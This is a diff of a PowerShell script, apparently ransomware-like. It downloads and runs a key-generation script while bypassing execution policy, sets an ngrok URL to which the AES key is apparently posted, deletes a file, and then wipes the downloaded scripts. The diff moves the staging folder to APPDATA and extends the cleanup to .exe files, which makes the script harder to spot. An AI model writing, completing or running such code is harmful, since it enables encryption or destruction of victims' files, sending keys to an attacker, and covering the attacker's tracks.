@@ -1,10 +1,10 @@
 ##Dowload and create AESKey & Post to Webserver
 ###############################################
-$DownloadFolder = "$env:USERPROFILE\Downloads"
+$DownloadFolder = "$env:APPDATA"
 
-Invoke-RestMethod -Uri https://raw.githubusercontent.com/jmlntw/powershell-aes/master/Scripts/New-AesKey.ps1 -OutFile $env:USERPROFILE\Downloads\New-AesKey.ps1
+Invoke-RestMethod -Uri https://raw.githubusercontent.com/jmlntw/powershell-aes/master/Scripts/New-AesKey.ps1 -OutFile $DownloadFolder\New-AesKey.ps1
 
-$key = powershell -executionpolicy ByPass -File $env:USERPROFILE\Downloads\New-AesKey.ps1 | Select-String "Key"
+$key = powershell -executionpolicy ByPass -File $DownloadFolder\New-AesKey.ps1 | Select-String "Key"
 $key = $key -Replace("Key","") -Replace(" ","")
 
 $url = "http://a1e2-52-22-69-233.ngrok.io"
@@ -41,7 +41,7 @@ Remove-Item $file.FullName
 ##Delete downloaded scripts
 ###########################
 
-foreach($file in Get-ChildItem $DownloadFolder -Recurse -filter *.ps1*)
+foreach($file in Get-ChildItem $DownloadFolder -Recurse -filter *.ps1*,*.exe*)
 
 {
 
